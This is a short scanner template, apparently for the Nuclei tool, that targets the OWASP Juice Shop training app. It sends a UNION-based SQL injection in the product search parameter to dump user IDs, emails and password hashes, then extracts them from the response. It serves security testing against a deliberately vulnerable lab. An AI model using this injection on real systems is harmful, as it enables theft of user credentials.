id: juice-shop-user-credentials

info:
  name: User Credentials
  author: yelaco
  severity: critical
  tags: juice-shop,sqli,creds
  description: Retrieve a list of all user credentials via SQL Injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/rest/products/search?q=qwert')) UNION SELECT id, '2', '3', email, password, '6', '7', '8', '9' FROM Users--"

    matchers:
      - type: word
        part: body
        words:
          - "@juice-sh.op"
        condition: and

    extractors:
      - type: json
        part: body
        json:
          - ".data | .[] | {id, email: .price, password: .deluxePrice}"
